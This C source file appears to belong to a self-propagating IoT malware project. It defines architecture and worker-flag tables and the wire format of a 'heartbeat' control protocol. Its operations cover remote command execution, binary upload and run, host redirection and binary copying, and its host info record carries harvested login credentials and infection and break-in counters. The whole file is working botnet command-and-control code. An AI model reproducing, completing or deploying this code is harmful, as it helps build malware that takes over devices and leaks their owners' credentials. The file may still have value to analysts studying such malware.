#include "protocol.h"
#include "util_rt.h"
#include "endian.h"
#include "dvault.h"

#include <string.h>

#include <assert.h>
#include <errno.h>
#include <limits.h>
#include <arpa/inet.h>


#define RETIF_NULL(x) if (x == NULL) { return; }


const char *prne_os_tostr (const prne_os_t x) {
	switch (x) {
	case PRNE_OS_LINUX: return "linux";
	}
	errno = EINVAL;
	return NULL;
}

prne_os_t prne_os_fstr (const char *str) {
	for (prne_os_t i = PRNE_OS_NONE + 1; i < NB_PRNE_OS; i += 1) {
		if (prne_nstreq(str, prne_os_tostr(i))) {
			return i;
		}
	}
	errno = EINVAL;
	return PRNE_OS_NONE;
}

bool prne_os_inrange (const prne_os_t x) {
	return PRNE_OS_NONE < x && x < NB_PRNE_OS;
}

const char *prne_arch_tostr (const prne_arch_t x) {
	switch (x){
	case PRNE_ARCH_AARCH64: return "aarch64";
	case PRNE_ARCH_ARMV4T: return "armv4t";
	case PRNE_ARCH_ARMV7: return "armv7";
	case PRNE_ARCH_X86_64: return "x86_64";
	case PRNE_ARCH_I686: return "i686";
	case PRNE_ARCH_MIPS: return "mips";
	case PRNE_ARCH_MPSL: return "mpsl";
	case PRNE_ARCH_PPC: return "ppc";
	case PRNE_ARCH_SH4: return "sh4";
	case PRNE_ARCH_M68K: return "m68k";
	case PRNE_ARCH_ARC: return "arc";
	case PRNE_ARCH_ARCEB: return "arceb";
	}
	errno = EINVAL;
	return NULL;
}

prne_arch_t prne_arch_fstr (const char *str) {
	for (prne_arch_t i = PRNE_ARCH_NONE + 1; i < NB_PRNE_ARCH; i += 1) {
		if (prne_nstreq(str, prne_arch_tostr(i))) {
			return i;
		}
	}
	errno = EINVAL;
	return PRNE_ARCH_NONE;
}

bool prne_arch_inrange (const prne_arch_t x) {
	return PRNE_ARCH_NONE < x && x < NB_PRNE_ARCH;
}

const char *prne_iflag_tostr (const prne_iflag_t x) {
	switch (x) {
	case PRNE_IFLAG_BA: return "ba";
	case PRNE_IFLAG_INIT_RUN: return "init_run";
	case PRNE_IFLAG_WKR_RCN: return "wkr_rcn";
	case PRNE_IFLAG_WKR_RESOLV: return "wkr_resolv";
	case PRNE_IFLAG_WKR_HTBT: return "wkr_htbt";
	}
	errno = EINVAL;
	return NULL;
}

prne_iflag_t prne_iflag_fstr (const char *str) {
	for (prne_iflag_t i = PRNE_IFLAG_NONE + 1; i < NB_PRNE_IFLAG; i += 1) {
		if (prne_nstreq(str, prne_iflag_tostr(i))) {
			return i;
		}
	}
	errno = EINVAL;
	return PRNE_IFLAG_NONE;
}

bool prne_iflag_inrange (const prne_iflag_t x) {
	return PRNE_IFLAG_NONE < x && x < NB_PRNE_IFLAG;
}


bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b) {
	size_t l;

	if (a->ver != b->ver) {
		return false;
	}
	switch (a->ver) {
	case PRNE_IPV_4: l = 4; break;
	case PRNE_IPV_6: l = 16; break;
	default: l = 0;
	}

	return memcmp(a->addr, b->addr, l) == 0;
}

void prne_net_ep_tosin4 (
	const prne_net_endpoint_t *ep,
	struct sockaddr_in *out)
{
	memcpy(&out->sin_addr, ep->addr.addr, 4);
	out->sin_family = AF_INET;
	out->sin_port = htons(ep->port);
}

void prne_net_ep_tosin6 (
	const prne_net_endpoint_t *ep,
	struct sockaddr_in6 *out)
{
	memcpy(&out->sin6_addr, ep->addr.addr, 16);
	out->sin6_family = AF_INET6;
	out->sin6_port = htons(ep->port);
}

bool prne_net_ep_set_ipv4 (
	const char *str,
	const uint16_t port,
	prne_net_endpoint_t *out)
{
	out->port = port;
	out->addr.ver = PRNE_IPV_4;
	return inet_pton(AF_INET, str, &out->addr.addr) != 0;
}

bool prne_net_ep_set_ipv6 (
	const char *str,
	const uint16_t port,
	prne_net_endpoint_t *out)
{
	out->port = port;
	out->addr.ver = PRNE_IPV_6;
	return inet_pton(AF_INET6, str, &out->addr.addr) != 0;
}

const char *prne_htbt_op_tostr (const prne_htbt_op_t x) {
	switch (x) {
	case PRNE_HTBT_OP_NOOP: return "noop";
	case PRNE_HTBT_OP_STATUS: return "status";
	case PRNE_HTBT_OP_HOST_INFO: return "hostinfo";
	case PRNE_HTBT_OP_HOVER: return "hover";
	case PRNE_HTBT_OP_SOLICIT: return "solicit";
	case PRNE_HTBT_OP_RUN_CMD: return "runcmd";
	case PRNE_HTBT_OP_UP_BIN: return "upbin";
	case PRNE_HTBT_OP_RUN_BIN: return "runbin";
	case PRNE_HTBT_OP_STDIO: return "stdio";
	case PRNE_HTBT_OP_RCB: return "rcb";
	}
	errno = EINVAL;
	return NULL;
}

void prne_htbt_init_msg_head (prne_htbt_msg_head_t *mh) {
	mh->op = PRNE_HTBT_OP_NOOP;
	mh->id = 0;
	mh->is_rsp = false;
}

void prne_htbt_free_msg_head (prne_htbt_msg_head_t *mh) {}

bool prne_htbt_eq_msg_head (
	const prne_htbt_msg_head_t *a,
	const prne_htbt_msg_head_t *b)
{
	return
		a->id == b->id &&
		a->op == b->op &&
		a->is_rsp == b->is_rsp;
}

void prne_htbt_init_status (prne_htbt_status_t *s) {
	s->code = 0;
	s->err = 0;
}

void prne_htbt_free_status (prne_htbt_status_t *s) {}

bool prne_htbt_eq_status (
	const prne_htbt_status_t *a,
	const prne_htbt_status_t *b)
{
	return
		a->code == b->code &&
		a->err == b->err;
}

void prne_init_host_cred (prne_host_cred_t *hc) {
	hc->id = NULL;
	hc->pw = NULL;
}

bool prne_alloc_host_cred (
	prne_host_cred_t *hc,
	const uint8_t id_len,
	const uint8_t pw_len)
{
	char *id, *pw;

	id = prne_alloc_str(id_len);
	pw = prne_alloc_str(pw_len);
	if (id == NULL || pw == NULL) {
		prne_free(id);
		prne_free(pw);
		return false;
	}

	prne_free(hc->id);
	prne_free(hc->pw);
	hc->id = id;
	hc->pw = pw;

	return true;
}

void prne_free_host_cred (prne_host_cred_t *hc) {
	RETIF_NULL(hc);

	prne_free(hc->id);
	prne_free(hc->pw);
	hc->id = NULL;
	hc->pw = NULL;
}

bool prne_eq_host_cred (const prne_host_cred_t *a, const prne_host_cred_t *b) {
	return
		prne_nstreq(a->id, b->id) &&
		prne_nstreq(a->pw, b->pw);
}

prne_htbt_ser_rc_t prne_enc_host_cred (
	uint8_t *data,
	const size_t len,
	size_t *actual,
	const prne_host_cred_t *in)
{
	const size_t id_len = prne_nstrlen(in->id);
	const size_t pw_len = prne_nstrlen(in->pw);

	*actual = id_len + pw_len + 2;
	if (*actual > 255) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	memcpy(data, in->id, id_len);
	data[id_len] = 0;
	memcpy(data + id_len + 1, in->pw, pw_len);
	data[id_len + 1 + pw_len] = 0;

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_dec_host_cred (
	const uint8_t *data,
	const size_t len,
	prne_host_cred_t *out)
{
	size_t id_len, pw_len;
	char *id, *pw, *end;

	id = (char*)data;
	end = prne_strnchr((const char*)data, 0, len);
	if (end == NULL) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}
	id_len = end - id;

	pw = id + id_len + 1;
	end = prne_strnchr(pw, 0, len - id_len - 1);
	if (end == NULL) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}
	pw_len = end - pw;

	if (!prne_alloc_host_cred(out, id_len, pw_len)) {
		return PRNE_HTBT_SER_RC_ERRNO;
	}
	memcpy(out->id, id, id_len + 1);
	memcpy(out->pw, pw, pw_len + 1);

	return PRNE_HTBT_SER_RC_OK;
}

void prne_htbt_init_host_info (prne_htbt_host_info_t *hi) {
	prne_memzero(hi, sizeof(prne_htbt_host_info_t));
}

bool prne_htbt_alloc_host_info (
	prne_htbt_host_info_t *hi,
	const size_t cred_len,
	const size_t bf_len)
{
	void *ny_mem[2];

	if (cred_len > 255 || bf_len > 255) {
		errno = EINVAL;
		return false;
	}

	ny_mem[0] = prne_calloc(1, cred_len);
	ny_mem[1] = prne_calloc(1, bf_len);
	if ((ny_mem[0] == NULL && cred_len > 0) ||
		(ny_mem[1] == NULL && bf_len > 0))
	{
		prne_free(ny_mem[0]);
		prne_free(ny_mem[1]);
		return false;
	}

	prne_free(hi->host_cred);
	hi->host_cred = (uint8_t*)ny_mem[0];
	hi->host_cred_len = cred_len;
	prne_free(hi->bf);
	hi->bf = (uint8_t*)ny_mem[1];
	hi->bf_len = bf_len;

	return true;
}

void prne_htbt_free_host_info (prne_htbt_host_info_t *hi) {
	RETIF_NULL(hi);

	prne_free(hi->host_cred);
	hi->host_cred = NULL;
	hi->host_cred_len = 0;
	prne_free(hi->bf);
	hi->bf = NULL;
	hi->bf_len = 0;
}

bool prne_htbt_eq_host_info (
	const prne_htbt_host_info_t *a,
	const prne_htbt_host_info_t *b)
{
	return
		a->parent_uptime == b->parent_uptime &&
		a->child_uptime == b->child_uptime &&
		a->bne_cnt == b->bne_cnt &&
		a->infect_cnt == b->infect_cnt &&
		a->parent_pid == b->parent_pid &&
		a->child_pid == b->child_pid &&
		a->arch == b->arch &&
		a->host_cred_len == b->host_cred_len &&
		memcmp(a->prog_ver, b->prog_ver, 16) == 0 &&
		memcmp(a->boot_id, b->boot_id, 16) == 0 &&
		memcmp(a->instance_id, b->instance_id, 16) == 0 &&
		memcmp(a->host_cred, b->host_cred, a->host_cred_len) == 0;
}

void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd) {
	cmd->mem_len = 0;
	cmd->mem = NULL;
	cmd->args = NULL;
	cmd->argc = 0;
	cmd->detach = false;
}

bool prne_htbt_alloc_cmd (
	prne_htbt_cmd_t *cmd,
	const size_t argc,
	const size_t *args_len)
{
	size_t i, str_size, pos, mem_len;
	char *mem = NULL;
	char **args = NULL;

	if (argc > PRNE_HTBT_ARGS_MAX) {
		errno = EINVAL;
		return false;
	}

	pos = 0;
	for (i = 0; i < argc; i += 1) {
		if (args_len[i] == SIZE_MAX) {
			errno = ENOMEM;
			return false;
		}
		str_size = args_len[i] + 1;
		if (str_size + pos < str_size) {
			errno = ENOMEM;
			return false;
		}

		pos += str_size;
	}

	if (pos > PRNE_HTBT_ARG_MEM_MAX) {
		errno = EINVAL;
		return false;
	}

	if (0 < argc) {
		mem_len = pos;
		args = (char**)prne_malloc(sizeof(char*), argc + 1);
		/* FIXME
		* What if mem_len == 0?
		*/
		mem = (char*)prne_malloc(1, mem_len);
		if (args == NULL || mem == NULL) {
			goto ERR;
		}

		pos = 0;
		for (i = 0; i < argc; i += 1) {
			args[i] = mem + pos;
			pos += args_len[i] + 1;
		}
		args[argc] = NULL;
	}
	else {
		mem_len = 0;
	}

	prne_free(cmd->args);
	prne_free(cmd->mem);
	cmd->mem = mem;
	cmd->mem_len = mem_len;
	cmd->args = args;
	cmd->argc = argc;

	return true;
ERR:
	prne_free(mem);
	prne_free(args);

	return false;
}

bool prne_htbt_set_cmd (prne_htbt_cmd_t *cmd, const char **args) {
	size_t *args_len = NULL;
	size_t i, argc;
	bool ret = true;

	if (args == NULL) {
		prne_htbt_free_cmd(cmd);
		return true;
	}

	for (i = 0; args[i] != NULL; i += 1);
	argc = i;

	if (argc == 0) {
		prne_htbt_free_cmd(cmd);
		return true;
	}

	args_len = (size_t*)prne_malloc(sizeof(size_t), argc);
	if (args_len == NULL) {
		return false;
	}
	for (i = 0; i < argc; i += 1) {
		args_len[i] = strlen(args[i]);
	}

	if (!prne_htbt_alloc_cmd(cmd, argc, args_len)) {
		ret = false;
		goto END;
	}
	for (i = 0; i < argc; i += 1) {
		memcpy(cmd->args[i], args[i], args_len[i]);
		cmd->args[i][args_len[i]] = 0;
	}

END:
	prne_free(args_len);
	return ret;
}

void prne_htbt_free_cmd (prne_htbt_cmd_t *cmd) {
	RETIF_NULL(cmd);

	prne_free(cmd->mem);
	prne_free(cmd->args);
	cmd->mem = NULL;
	cmd->mem_len = 0;
	cmd->args = NULL;
	cmd->argc = 0;
}

bool prne_htbt_eq_cmd (const prne_htbt_cmd_t *a, const prne_htbt_cmd_t *b) {
	if (!(a->mem_len == b->mem_len &&
		a->argc == b->argc &&
		memcmp(a->mem, b->mem, a->mem_len) == 0))
	{
		return false;
	}

	for (size_t i = 0; i < a->argc; i += 1) {
		if (!prne_nstreq(a->args[i], b->args[i])) {
			return false;
		}
	}

	return true;
}

void prne_htbt_init_bin_meta (prne_htbt_bin_meta_t *nb) {
	nb->alloc_len = 0;
	prne_htbt_init_cmd(&nb->cmd);
}

void prne_htbt_free_bin_meta (prne_htbt_bin_meta_t *nb) {
	RETIF_NULL(nb);

	prne_htbt_free_cmd(&nb->cmd);
}

bool prne_htbt_eq_bin_meta (
	const prne_htbt_bin_meta_t *a,
	const prne_htbt_bin_meta_t *b)
{
	return
		a->alloc_len == b->alloc_len &&
		prne_htbt_eq_cmd(&a->cmd, &b->cmd);
}

void prne_htbt_init_hover (prne_htbt_hover_t *ho) {
	prne_memzero(ho, sizeof(prne_htbt_hover_t));
}

void prne_htbt_free_hover (prne_htbt_hover_t *ho) {}

bool prne_htbt_eq_hover (
	const prne_htbt_hover_t *a,
	const prne_htbt_hover_t *b)
{
	return
		memcmp(a->v4.addr, b->v4.addr, 4) == 0 &&
		memcmp(a->v6.addr, b->v6.addr, 16) == 0 &&
		a->v4.port == b->v4.port &&
		a->v6.port == b->v6.port;
}

bool prne_htbt_cp_hover (const prne_htbt_hover_t *a, prne_htbt_hover_t *b) {
	memcpy(b, a, sizeof(prne_htbt_hover_t));
	return true;
}

void prne_htbt_init_stdio (prne_htbt_stdio_t *s) {
	s->len = 0;
	s->err = false;
	s->fin = false;
}

void prne_htbt_free_stdio (prne_htbt_stdio_t *s) {}

bool prne_htbt_eq_stdio (
	const prne_htbt_stdio_t *a,
	const prne_htbt_stdio_t *b)
{
	return
		a->len == b->len &&
		a->err == b->err &&
		a->fin == b->fin;
}

void prne_htbt_init_rcb (prne_htbt_rcb_t *r) {
	r->arch = PRNE_ARCH_NONE;
	r->compat = false;
}

void prne_htbt_free_rcb (prne_htbt_rcb_t *r) {}

bool prne_htbt_eq_rcb (const prne_htbt_rcb_t *a, const prne_htbt_rcb_t *b) {
	return a->arch == b->arch && a->compat == b->compat;
}

prne_htbt_ser_rc_t prne_htbt_ser_msg_head (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_msg_head_t *in)
{
	uint16_t id;

	*actual = 3;

	if (mem_len < 3) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}
	if (in->id & 0x8000 ||
		PRNE_HTBT_OP_NONE == in->op ||
		(in->op == PRNE_HTBT_OP_NOOP && in->id != 0) ||
		(in->id == 0 && in->op != PRNE_HTBT_OP_NOOP)) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}

	id = (in->is_rsp ? 0 : 0x8000) | in->id;
	mem[0] = prne_getmsb16(id, 0);
	mem[1] = prne_getmsb16(id, 1);
	mem[2] = (uint8_t)in->op;

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_status (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_status_t *in)
{
	*actual = 5;

	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] = (uint8_t)in->code;
	mem[1] = prne_getmsb32(in->err, 0);
	mem[2] = prne_getmsb32(in->err, 1);
	mem[3] = prne_getmsb32(in->err, 2);
	mem[4] = prne_getmsb32(in->err, 3);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_host_info (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_host_info_t *in)
{
	if (in->host_cred_len > 255 || in->bf_len > 255) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}

	*actual = 112 + in->host_cred_len + in->bf_len;
	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	memcpy(mem + 0, in->prog_ver, 16);
	memcpy(mem + 16, in->boot_id, 16);
	memcpy(mem + 32, in->instance_id, 16);
	memcpy(mem + 48, in->org_id, 16);
	mem[64] = prne_getmsb64(in->parent_uptime, 0);
	mem[65] = prne_getmsb64(in->parent_uptime, 1);
	mem[66] = prne_getmsb64(in->parent_uptime, 2);
	mem[67] = prne_getmsb64(in->parent_uptime, 3);
	mem[68] = prne_getmsb64(in->parent_uptime, 4);
	mem[69] = prne_getmsb64(in->parent_uptime, 5);
	mem[70] = prne_getmsb64(in->parent_uptime, 6);
	mem[71] = prne_getmsb64(in->parent_uptime, 7);
	mem[72] = prne_getmsb64(in->child_uptime, 0);
	mem[73] = prne_getmsb64(in->child_uptime, 1);
	mem[74] = prne_getmsb64(in->child_uptime, 2);
	mem[75] = prne_getmsb64(in->child_uptime, 3);
	mem[76] = prne_getmsb64(in->child_uptime, 4);
	mem[77] = prne_getmsb64(in->child_uptime, 5);
	mem[78] = prne_getmsb64(in->child_uptime, 6);
	mem[79] = prne_getmsb64(in->child_uptime, 7);
	mem[80] = prne_getmsb64(in->bne_cnt, 0);
	mem[81] = prne_getmsb64(in->bne_cnt, 1);
	mem[82] = prne_getmsb64(in->bne_cnt, 2);
	mem[83] = prne_getmsb64(in->bne_cnt, 3);
	mem[84] = prne_getmsb64(in->bne_cnt, 4);
	mem[85] = prne_getmsb64(in->bne_cnt, 5);
	mem[86] = prne_getmsb64(in->bne_cnt, 6);
	mem[87] = prne_getmsb64(in->bne_cnt, 7);
	mem[88] = prne_getmsb64(in->infect_cnt, 0);
	mem[89] = prne_getmsb64(in->infect_cnt, 1);
	mem[90] = prne_getmsb64(in->infect_cnt, 2);
	mem[91] = prne_getmsb64(in->infect_cnt, 3);
	mem[92] = prne_getmsb64(in->infect_cnt, 4);
	mem[93] = prne_getmsb64(in->infect_cnt, 5);
	mem[94] = prne_getmsb64(in->infect_cnt, 6);
	mem[95] = prne_getmsb64(in->infect_cnt, 7);
	mem[96] = prne_getmsb32(in->crash_cnt, 0);
	mem[97] = prne_getmsb32(in->crash_cnt, 1);
	mem[98] = prne_getmsb32(in->crash_cnt, 2);
	mem[99] = prne_getmsb32(in->crash_cnt, 3);
	mem[100] = prne_getmsb32(in->parent_pid, 0);
	mem[101] = prne_getmsb32(in->parent_pid, 1);
	mem[102] = prne_getmsb32(in->parent_pid, 2);
	mem[103] = prne_getmsb32(in->parent_pid, 3);
	mem[104] = prne_getmsb32(in->child_pid, 0);
	mem[105] = prne_getmsb32(in->child_pid, 1);
	mem[106] = prne_getmsb32(in->child_pid, 2);
	mem[107] = prne_getmsb32(in->child_pid, 3);
	mem[108] = (uint8_t)in->host_cred_len;
	mem[109] = (uint8_t)in->arch;
	mem[110] = (uint8_t)in->os;
	mem[111] = (uint8_t)in->bf_len;
	memcpy(mem + 112, in->host_cred, in->host_cred_len);
	memcpy(mem + 112 + in->host_cred_len, in->bf, in->bf_len);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_hover (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_hover_t *in)
{
	*actual = 24;
	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	memcpy(mem, in->v4.addr, 4);
	mem[4] = prne_getmsb16(in->v4.port, 0);
	mem[5] = prne_getmsb16(in->v4.port, 1);
	memcpy(mem + 6, in->v6.addr, 16);
	mem[22] = prne_getmsb16(in->v6.port, 0);
	mem[23] = prne_getmsb16(in->v6.port, 1);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_cmd (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_cmd_t *in)
{
	if (in->mem_len > 0) {
		if (in->mem_len > PRNE_HTBT_ARG_MEM_MAX ||
			in->argc == 0 ||
			in->mem[in->mem_len - 1] != 0)
		{
			return PRNE_HTBT_SER_RC_FMT_ERR;
		}
	}
	*actual = in->mem_len + 2;

	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] =
		(prne_getmsb16(in->mem_len, 0) & 0x03) |
		(in->detach ? 0x04 : 0x00);
	mem[1] = prne_getmsb16(in->mem_len, 1);
	memcpy(mem + 2, in->mem, in->mem_len);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_bin_meta_t *in)
{
	size_t chain_actual;
	prne_htbt_ser_rc_t ret;

	*actual = 3 + 2;
	if (in->alloc_len > PRNE_HTBT_BIN_ALLOC_LEN_MAX) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}
	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}
	ret = prne_htbt_ser_cmd(mem + 3, mem_len - 3, &chain_actual, &in->cmd);
	*actual = chain_actual + 3;
	if (ret != PRNE_HTBT_SER_RC_OK) {
		return ret;
	}

	mem[0] = prne_getmsb32(in->alloc_len, 1);
	mem[1] = prne_getmsb32(in->alloc_len, 2);
	mem[2] = prne_getmsb32(in->alloc_len, 3);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_stdio (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_stdio_t *in)
{
	*actual = 2;
	if (in->len > PRNE_HTBT_STDIO_LEN_MAX) {
		return PRNE_HTBT_SER_RC_FMT_ERR;
	}
	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] =
		(in->err ? 0x80 : 0) |
		(in->fin ? 0x40 : 0) |
		(prne_getmsb16(in->len, 0) & 0x0F);
	mem[1] = prne_getmsb16(in->len, 1);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_ser_rcb (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_rcb_t *in)
{
	*actual = 3;
	if (mem_len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	mem[0] = (uint8_t)(
		(in->compat ? 0x80 : 0x00) |
		(in->self ? 0x40 : 0x00));
	mem[1] = (uint8_t)in->os;
	mem[2] = (uint8_t)in->arch;

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_msg_head (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_msg_head_t *out)
{
	*actual = 3;

	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	out->id = prne_recmb_msb16(0x7F & data[0], data[1]);
	out->op = (uint8_t)data[2];
	out->is_rsp = (data[0] & 0x80) == 0;

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_status (
	uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_status_t *out)
{
	*actual = 5;

	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	out->code = (prne_htbt_status_code_t)data[0];
	out->err = prne_recmb_msb32(data[1], data[2], data[3], data[4]);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_host_info (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_host_info_t *out)
{
	size_t cred_size, bf_size;

	*actual = 112;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	cred_size = data[108];
	bf_size = data[111];
	*actual += cred_size + bf_size;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	if (!prne_htbt_alloc_host_info(out, cred_size, bf_size)) {
		return PRNE_HTBT_SER_RC_ERRNO;
	}

	memcpy(out->prog_ver, data + 0, 16);
	memcpy(out->boot_id, data + 16, 16);
	memcpy(out->instance_id, data + 32, 16);
	memcpy(out->org_id, data + 48, 16);
	out->parent_uptime = prne_recmb_msb64(
		data[64],
		data[65],
		data[66],
		data[67],
		data[68],
		data[69],
		data[70],
		data[71]);
	out->child_uptime = prne_recmb_msb64(
		data[72],
		data[73],
		data[74],
		data[75],
		data[76],
		data[77],
		data[78],
		data[79]);
	out->bne_cnt = prne_recmb_msb64(
		data[80],
		data[81],
		data[82],
		data[83],
		data[84],
		data[85],
		data[86],
		data[87]);
	out->infect_cnt = prne_recmb_msb64(
		data[88],
		data[89],
		data[90],
		data[91],
		data[92],
		data[93],
		data[94],
		data[95]);
	out->crash_cnt = prne_recmb_msb32(
		data[96],
		data[97],
		data[98],
		data[99]);
	out->parent_pid = prne_recmb_msb32(
		data[100],
		data[101],
		data[102],
		data[103]);
	out->child_pid = prne_recmb_msb32(
		data[104],
		data[105],
		data[106],
		data[107]);
	out->arch = (prne_arch_t)data[109];
	out->os = (prne_os_t)data[110];
	memcpy(out->host_cred, data + 112, cred_size);
	memcpy(out->bf, data + 112 + cred_size, bf_size);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_hover (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_hover_t *out)
{
	*actual = 24;
	if (*actual > len) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	memcpy(out->v4.addr, data, 4);
	out->v4.port = prne_recmb_msb16(data[4], data[5]);
	memcpy(out->v6.addr, data + 6, 16);
	out->v6.port = prne_recmb_msb16(data[22], data[23]);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_cmd (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_cmd_t *out)
{
	size_t args_len, argc;
	char **args = NULL;
	char *mem = NULL;
	prne_htbt_ser_rc_t ret = PRNE_HTBT_SER_RC_OK;
	int saved_errno;

	*actual = 2;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	args_len = prne_recmb_msb16(0x03 & data[0], data[1]);
	*actual += args_len;

	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	if (args_len > 0) {
		/* FIXME
		* args_len == 0 allowed?
		*/
		mem = (char*)prne_malloc(1, args_len);
		if (mem == NULL) {
			ret = PRNE_HTBT_SER_RC_ERRNO;
			goto END;
		}
		memcpy(mem, data + 2, args_len);
	}

	saved_errno = errno;
	errno = 0;
	args = prne_htbt_parse_args(
		mem,
		args_len,
		0,
		NULL,
		&argc,
		PRNE_HTBT_ARGS_MAX);
	if (args == NULL) {
		ret =
			errno != 0 ?
			PRNE_HTBT_SER_RC_ERRNO :
			PRNE_HTBT_SER_RC_FMT_ERR;
		goto END;
	}
	errno = saved_errno;

	prne_htbt_free_cmd(out);
	out->mem = mem;
	out->mem_len = args_len;
	out->args = args;
	out->argc = argc;
	out->detach = (0x04 & data[0]) != 0;
	mem = NULL;
	args = NULL;

END:
	prne_free(mem);
	prne_free(args);
	return ret;
}

prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_bin_meta_t *out)
{
	size_t chain_actual;
	prne_htbt_ser_rc_t ret;

	*actual = 5;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}
	ret = prne_htbt_dser_cmd(data + 3, len - 3, &chain_actual, &out->cmd);
	*actual = chain_actual + 3;
	if (ret != PRNE_HTBT_SER_RC_OK) {
		return ret;
	}

	out->alloc_len = prne_recmb_msb32(0, data[0], data[1], data[2]);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_stdio (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_stdio_t *out)
{
	*actual = 2;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	out->err = (data[0] & 0x80) != 0;
	out->fin = (data[0] & 0x40) != 0;
	out->len = prne_recmb_msb16(data[0] & 0x0F, data[1]);

	return PRNE_HTBT_SER_RC_OK;
}

prne_htbt_ser_rc_t prne_htbt_dser_rcb (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_rcb_t *out)
{
	*actual = 3;
	if (len < *actual) {
		return PRNE_HTBT_SER_RC_MORE_BUF;
	}

	out->compat = (data[0] & 0x80) != 0;
	out->self = (data[0] & 0x40) != 0;
	out->os = (prne_os_t)data[1];
	out->arch = (prne_arch_t)data[2];

	return PRNE_HTBT_SER_RC_OK;
}

char **prne_htbt_parse_args (
	char *m_args,
	const size_t args_size,
	const size_t add_argc,
	char **add_args,
	size_t *argc,
	const size_t max_args)
{
	char *ptr, *end = m_args + args_size, *next;
	size_t i, cnt;
	char **ret;

	cnt = 0;
	ptr = m_args;
	while (ptr < end) {
		next = prne_strnchr(ptr, 0, end - ptr);
		if (next == NULL) {
			return NULL; // reject non-null-terminated
		}
		else {
			if (next - ptr > 0) {
				cnt += 1;
			}
			ptr = next + 1;
		}
	}
	cnt += add_argc;
	if (cnt > max_args) {
		return NULL;
	}

	ret = (char**)prne_malloc(sizeof(char*), cnt + 1);
	if (ret == NULL) {
		return NULL;
	}
	ret[cnt] = NULL;
	if (argc != NULL) {
		*argc = cnt;
	}

	for (i = 0; i < add_argc; i +=1) {
		ret[i] = add_args[i];
	}

	ptr = m_args;
	while (ptr < end) {
		next = prne_strnchr(ptr, 0, end - ptr);
		if (next - ptr > 0) {
			ret[i++] = ptr;
		}
		ptr = next + 1;
	}

	return ret;
}

uint16_t prne_htbt_gen_msgid (void *ctx, uint16_t(*rnd_f)(void*)) {
	return (rnd_f(ctx) % PRNE_HTBT_MSG_ID_DELTA) + PRNE_HTBT_MSG_ID_MIN;
}

